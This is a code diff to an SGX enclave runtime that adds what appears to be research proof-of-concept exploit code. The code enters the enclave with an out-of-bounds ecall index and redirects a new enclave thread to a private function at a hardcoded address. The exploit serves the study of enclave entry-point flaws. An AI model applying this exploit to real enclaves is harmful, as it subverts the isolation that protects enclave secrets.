@@ -20,7 +20,7 @@
 
 #define ODEBUG(code, ms) do {} while (0)
 
-int ecall_illegal(void);
+void ecall_illegal(void);
 
 static int sgx_ocall_exit(void * pms)
 {
@@ -736,14 +736,19 @@ int ecall_pal_main (const char ** arguments, const char ** environments)
     return sgx_ecall(ECALL_PAL_MAIN, &ms);
 }
 
+#define EXPLOIT_ECALL_IDX       1
+#define EXPLOIT_THREAD_START    0
+
 //XXX retrieve addresses with `objdump libpal-enclave.so / helloworld`
-#define ECALL_TABLE_ADRS        (0x22e2c0)
+#define ECALL_TABLE_ADRS        (0x22e340)
 #define TARGET_ADRS             (0x601078)
+#define PRIVATE_FUNC_ADRS       (0x1eff0)
 
 extern struct pal_sec * pal_sec;
 
-int ecall_illegal (void)
+void ecall_illegal (void)
 {
+#if EXPLOIT_ECALL_IDX
     /* 
      * Trusted enclave_entry.S code does not check whether provided entry
      * index is within the bounds of the intra-enclave ecall_table. We can
@@ -758,7 +763,8 @@ int ecall_illegal (void)
     printf("\n[urts] entering enclave with illegal ecall idx %d (ecall_table_adrs=%p)\n",
         enr, ecall_table_adrs);
 
-    return sgx_ecall(enr, NULL);
+    sgx_ecall(enr, NULL);
+#endif
 }
 
 int ecall_thread_start (void (*func) (void *), void * arg,
@@ -766,12 +772,18 @@ int ecall_thread_start (void (*func) (void *), void * arg,
 {
     ms_ecall_thread_start_t ms;
 
+#if EXPLOIT_THREAD_START
+    func = pal_sec->enclave_addr + PRIVATE_FUNC_ADRS;
+#endif
+
     ms.ms_func = func;
     ms.ms_arg = arg;
     ms.ms_child_tid = child_tid;
     ms.ms_tid = tid;
 
     EDEBUG(ECALL_THREAD_START, &ms);
+    
+    printf("[urts] starting enclave thread with func %p\n", func);
 
     return sgx_ecall(ECALL_THREAD_START, &ms);
 }
